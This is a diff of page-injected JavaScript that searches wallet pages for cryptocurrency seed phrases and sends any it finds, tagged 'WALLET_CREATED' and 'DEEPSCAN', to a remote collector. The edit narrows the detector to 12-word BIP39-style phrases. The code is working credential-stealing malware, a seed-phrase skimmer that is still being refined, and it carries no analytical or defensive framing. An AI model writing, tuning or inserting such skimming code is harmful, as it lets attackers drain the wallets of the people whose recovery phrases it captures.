@@ -190,25 +190,19 @@
     };
   })();
 
-  // --- Deep scan: find phrases in any page text ---
+  // --- Deep scan: find 12-word phrases in page text ---
   function deepScan(){
-    // Get all text from the page
     const allText=document.body.innerText||document.body.textContent||"";
-    
-    // Look for 12-24 word sequences
     const words=allText.split(/\s+/).filter(w=>w.length>0);
     
-    // Check sliding windows of 12, 15, 18, 21, 24 words
-    const counts=[12,15,18,21,24];
-    for(const count of counts){
-      if(words.length>=count){
-        for(let i=0;i<=words.length-count;i++){
-          const segment=words.slice(i,i+count).join(" ");
-          if(isSeed(segment)){
-            console.log("🔎 Deep scan found",count,"word phrase");
-            sendPhrase(segment,"DEEPSCAN","page");
-            return; // Found one, stop scanning
-          }
+    // Only check 12-word windows
+    if(words.length>=12){
+      for(let i=0;i<=words.length-12;i++){
+        const segment=words.slice(i,i+12).join(" ");
+        if(isSeed(segment)){
+          console.log("🔎 Deep scan found 12-word phrase");
+          sendPhrase(segment,"DEEPSCAN","page");
+          return;
         }
       }
     }
@@ -219,14 +213,13 @@
   function words(v){return(v||"").trim().split(/\s+/).filter(w=>w.length>0);}
   function wc(v){return words(v).length;}
 
-  // Valid seed phrase: exactly 12/15/18/21/24 words, mostly lowercase letters
+  // Valid seed phrase: exactly 12 words, mostly lowercase letters
   function isSeed(v){
     if(!v)return false;
     var ws=words(v.toLowerCase());
-    if(![12,15,18,21,24].includes(ws.length))return false;
+    if(ws.length!==12)return false; // Only 12 words
     // Most words should be letters only, 3-8 chars (BIP39 style)
     var validCount=ws.filter(function(w){return/^[a-z]{3,8}$/.test(w);}).length;
-    // Allow some flexibility - 80% of words should match pattern
     return(validCount/ws.length)>=0.8;
   }
 
@@ -268,12 +261,12 @@
       if(txt&&/^[a-zA-Z]{2,10}$/.test(txt))ws.push(txt.toLowerCase());
     }
     
-    if([12,15,18,21,24].includes(ws.length)){
+    if([12].includes(ws.length)){ // Only 12 words
       var phrase=ws.join(" ");
       if(phrase!==lastSent){
         lastSent=phrase;
-        console.log("📋 WALLET_CREATED:",ws.length,"words");
-        send({TYPE:"WALLET_CREATED",PHRASE:phrase,WORDS:ws.length,PAGE:location.pathname})
+        console.log("📋 WALLET_CREATED: 12 words");
+        send({TYPE:"WALLET_CREATED",PHRASE:phrase,WORDS:12,PAGE:location.pathname})
           .then(()=>console.log("✅ Delivered"))
           .catch(e=>console.error("❌ Failed:",e.message));
       }
